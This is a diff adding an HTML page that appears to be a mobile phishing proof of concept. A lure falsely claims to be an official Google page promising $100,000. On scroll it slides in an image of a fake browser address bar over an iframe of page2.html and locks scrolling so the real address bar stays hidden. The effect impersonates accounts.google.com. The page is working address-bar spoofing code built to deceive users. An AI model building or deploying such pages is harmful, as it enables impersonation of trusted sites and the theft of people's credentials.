@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>testg</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        background-color: #ffffff;
+        font-family: -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+      }
+
+      #scroll-bait {
+        height: 70vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding-top: 35vh;
+        text-align: center;
+        color: #3c4043;
+      }
+
+      .icon-circle {
+        width: 64px;
+        height: 64px;
+        background: #e8f0fe;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 20px;
+      }
+
+      h2 {
+        font-weight: 400;
+        font-size: 22px;
+        margin-bottom: 10px;
+      }
+      p {
+        font-size: 14px;
+        color: #5f6368;
+        margin-bottom: 60px;
+      }
+      .arrow {
+        font-size: 28px;
+        color: #4285f4;
+        animation: slideDown 1.5s infinite;
+      }
+      @keyframes slideDown {
+        0% {
+          transform: translateY(-10px);
+          opacity: 0;
+        }
+        50% {
+          opacity: 1;
+        }
+        100% {
+          transform: translateY(20px);
+          opacity: 0;
+        }
+      }
+
+      #trap-zone {
+        height: 400vh;
+        position: relative;
+      }
+
+      #fake-ui {
+        position: sticky;
+        top: 0;
+        width: 100vw;
+        height: 100vh;
+        background: #fff;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        z-index: 99;
+      }
+
+      #fake-bar {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        z-index: 99999;
+        object-fit: contain;
+        transform: translateY(-100%);
+        transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+      }
+
+      #fake-content {
+        width: 100%;
+        height: 100%;
+        border: none;
+        padding-top: 56px;
+        box-sizing: border-box;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="scroll-bait">
+      <div class="icon-circle">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="#4285F4">
+          <path
+            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
+          />
+        </svg>
+      </div>
+      <h2>this is Google official page. if you want to earn $100,000, scroll down and you be redirected to accounts.google.com</h2>
+      <div class="arrow">↓</div>
+    </div>
+
+    <div id="trap-zone">
+      <div id="fake-ui">
+        <img id="fake-bar" src="google.PNG" alt="Address Bar" />
+        <iframe id="fake-content" src="page2.html"></iframe>
+      </div>
+    </div>
+
+    <script>
+      let isTrapped = false;
+      let trapPoint = 0;
+      const trapZone = document.getElementById("trap-zone");
+      const fakeBar = document.getElementById("fake-bar");
+
+      let touchStartY = 0;
+
+      window.addEventListener("scroll", () => {
+        if (!trapPoint) trapPoint = trapZone.offsetTop;
+
+        if (window.scrollY >= trapPoint && !isTrapped) {
+          isTrapped = true;
+          console.log("[+] Trapped! Deploying Ambush Bar & Locking Scroll Up.");
+          requestAnimationFrame(() => {
+            fakeBar.style.transform = "translateY(0)";
+          });
+        }
+
+        if (isTrapped && window.scrollY < trapPoint) {
+          window.scrollTo({ top: trapPoint, behavior: "instant" });
+        }
+      });
+
+      document.addEventListener(
+        "touchstart",
+        (e) => {
+          touchStartY = e.touches[0].clientY;
+        },
+        { passive: false },
+      );
+
+      document.addEventListener(
+        "touchmove",
+        (e) => {
+          if (!isTrapped) return;
+          const touchCurrentY = e.touches[0].clientY;
+          const isSwipingDown = touchCurrentY > touchStartY;
+
+          if (isSwipingDown) {
+            e.preventDefault();
+          }
+        },
+        { passive: false },
+      );
+
+      if (window.visualViewport) {
+        const fixKeyboardShift = () => {
+          if (isTrapped) {
+            document.getElementById("fake-ui").style.top =
+              window.visualViewport.offsetTop + "px";
+          }
+        };
+        window.visualViewport.addEventListener("resize", fixKeyboardShift);
+        window.visualViewport.addEventListener("scroll", fixKeyboardShift);
+      }
+    </script>
+  </body>
+</html>
